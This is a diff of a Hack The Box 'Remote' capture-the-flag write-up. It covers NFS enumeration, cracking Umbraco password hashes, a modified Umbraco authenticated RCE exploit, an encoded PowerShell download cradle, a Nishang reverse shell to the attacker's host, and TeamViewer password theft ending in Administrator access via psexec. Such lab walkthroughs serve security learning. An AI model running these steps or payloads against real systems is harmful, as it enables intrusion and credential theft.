@@ -1,6 +1,6 @@
 # Remote Write-up
 
-I Started off with an Nmap scan to learn about the box.
+I Started off with an Nmap scan to get a lay of the land.
 
 ```bash
 root@HTBKali:~/HTB/Remote# nmap -A 10.10.10.180 -oN nmap/remote-A_scan
@@ -80,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 134.24 seconds
 
 From this I noted open ports to check out being  21, 111, 80, 139, 445.
 
-I like to leave webservers to be the last port to check out because they tend to take the most effort.  It is smart to start gobuster running while enumerating other services
+I like to leave webservers to be the last port to check out because they tend to take the most effort.  It is smart to start gobuster running while enumerating other services.
 
 I started with checking the Anonymous login to ftp.
 
@@ -151,7 +151,7 @@ Export list for 10.10.10.180:
 /site_backups (everyone)
 ```
 
-Now that I know the directory /site_backups is mountable by everyone lets mount it and see what is inside.
+Now that I know the directory `/site_backups` is mountable by everyone lets mount it and see what is inside.
 
 ```bash
 root@HTBKali:~/HTB/Remote# mkdir nfs
@@ -184,7 +184,7 @@ Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting             | exploit
 Shellcodes: No Result
 ```
 
-We see that Umbraco CMS 7.12.4 is vulnerable to an Authenticated RCE.  We just need to find those Creds.  After some more enumeration you find the SQL databese file `Umbraco.sdf` in `/App_Data`.  We can look at the contents of the file with strings.
+I see that Umbraco CMS 7.12.4 is vulnerable to an Authenticated RCE.  I just need to find those Creds.  After some more enumeration I found the SQL databese file `Umbraco.sdf` in `/App_Data`. I look at the contents of the file with strings.
 
 ```bash
 root@HTBKali:~/HTB/Remote/nfs/App_Data# strings Umbraco.sdf | head
@@ -198,7 +198,7 @@ ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpn
 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 ```
 
-From this we can figure out the database looks something like 
+From this I figure out the database looks something like: 
 
 | User | Login Username |  Password(hashed) | Hashing algorithm|
 |-----|----|----|-----|
@@ -213,7 +213,7 @@ root@HTBKali:~/HTB/Remote# hashcat -h | grep SHA1
     100 | SHA1                                             | Raw Hash
 ```
 
-Then run hashcat with rockyou.txt.
+Then I ran hashcat with rockyou.txt.
 
 ```bash
 vipertooth@vipertooth:~/HTB/remote$ hashcat -a 0 -m 100 hashes /opt/rockyou.txt
@@ -244,7 +244,7 @@ Started: Thu Mar 26 13:23:34 2020
 Stopped: Thu Mar 26 13:23:43 2020
 ```
 
-Now lets look at the RCE script we found with searchsploit and test it.
+Now I go back and check out the RCE script I found with searchsploit.
 
 ```bash
 # Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
@@ -320,13 +320,36 @@ password="baconandcheese";
 host = "http://10.10.10.180";
 ```
 
-Next I see the code is just poping calc. I changed this to `calc.exe` to `ping.exe` to test the execution of the script. I also added arguments for ping.exe where the script says `string cmd = ""`
+Next I see the code is just poping calc. I changed this from `calc.exe` to `ping.exe` to test the execution of the script. I also added arguments for ping.exe where the script says `string cmd = ""`
 
 ![alt text](https://github.com/vipertooth/HTB-Remote/blob/master/resources/poc-ping.png)
 
-Time to get a reverse shell!  Nishang as a few good powershell shells that come loaded into Kali. The one I use most is `/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1`.  I need to modify the file with my host and port.  This can be done by copying the example in the being and pasting it at the last line of the script. 
+Time to get a reverse shell!  Nishang as a few good powershell shells that come loaded into Kali. The one I use most is `/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1`.  I need to modify the file with my host and port.  This can be done by copying the example in the beginning and pasting it at the last line of the script. 
 
 ```bash
+function Invoke-PowerShellTcp
+{
+<#
+.SYNOPSIS
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
+
+.DESCRIPTION
+This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.
+Also, a standard netcat can connect to this script Bind to a specific port.
+
+The script is derived from Powerfun written by Ben Turner & Dave Hardy
+
+.PARAMETER IPAddress
+The IP address to connect to when using the -Reverse switch.
+
+.PARAMETER Port
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+
+<snip>
+
 {
         Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
         Write-Error $_
@@ -335,7 +358,7 @@ Time to get a reverse shell!  Nishang as a few good powershell shells that come 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.215 -Port 9003
 ```
 
-I changed the file name to r2.ps1 to make it easy to use.  To get the exploit to call this file we will need to change the script to call back and grab the reverse shell.  To make sure there is no issues being sent over http it is best to base64 encode the arguments string.  To do with I will open powershell on Kali and create the encoded string.
+I changed the file name to r2.ps1 to make it easy to use.  To get the exploit to call this file I had to change the script to call back and grab the reverse shell.  To make sure there is no issues being sent over http it is best to base64 encode the arguments string.  To do with I will open powershell on Kali and create the encoded string.
 
 ```bash
 root@HTBKali:~/HTB/Remote# pwsh
@@ -349,7 +372,7 @@ PS /root/HTB/Remote> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.G
 SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANwAuADIAMQA1ADoAOQAwADAAMAAvAHIAMgAuAHAAcwAxACcAKQA=
 ```
 
-Then I updated the exploit script to be as follows:
+Then I updated the exploit script to be as follows:   
 ```python
 payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
@@ -362,7 +385,7 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
  </xsl:template> </xsl:stylesheet> ';
  ```
-Before we run the exploit I opened a webserver on 9000 and a nc listener on 9003.
+Before I ran the exploit I opened a webserver on 9000 and a nc listener on 9003.
 
 ![alt text](https://github.com/vipertooth/HTB-Remote/blob/master/resources/lowpriv-shell.png)
 
@@ -405,9 +428,9 @@ This is a tool for finding privesc paths on the system. It also highlights highe
 
 ![alt text}(https://github.com/vipertooth/HTB-Remote/blob/master/resources/winPEAS.png)
 
-As you can see the port 5939 is only listening on localhost. port to enumerate.  With a quick google you can see that 5939 is used for teamviewer
+I can see the port 5939 is only listening on localhost. With a quick google you can see that 5939 is used for teamviewer
 
-With some more enumeration we verify this.
+With some more enumeration I verify this.
 
 ```bash
 PS C:\windows\system32\inetsrv>netstat -ano
@@ -425,7 +448,7 @@ Image Name                     PID Session Name        Session#    Mem Usage
 TeamViewer_Service.exe        2952                            0     18,704 K
 ```
 
-From here when we search metasploit for teamviewer we find a module for getting passwords. When it is ran we get the Password `!R3m0te!`
+From here when I search metasploit for teamviewer I fund a module for getting passwords. When it is ran I get the Password `!R3m0te!`
 
 ```bash
 msf5 post(windows/gather/credentials/teamviewer_passwords) > run
@@ -435,7 +458,7 @@ msf5 post(windows/gather/credentials/teamviewer_passwords) > run
 [*] Post module execution completed 
 ```
 
-Now that we have new creds it is best to test them with psexec. Impacket is a collection of tools that can be used against windows systems.  Located at `/usr/share/doc/python3-impacket/examples`
+Now that I have new creds it is best to test them with psexec. Impacket is a collection of tools that can be used against windows systems.  Located at `/usr/share/doc/python3-impacket/examples` it has a linux version of psexec.
 
 ```bash
 root@HTBKali:/usr/share/doc/python3-impacket/examples# ./psexec.py Administrator:\!R3m0te\!@10.10.10.180
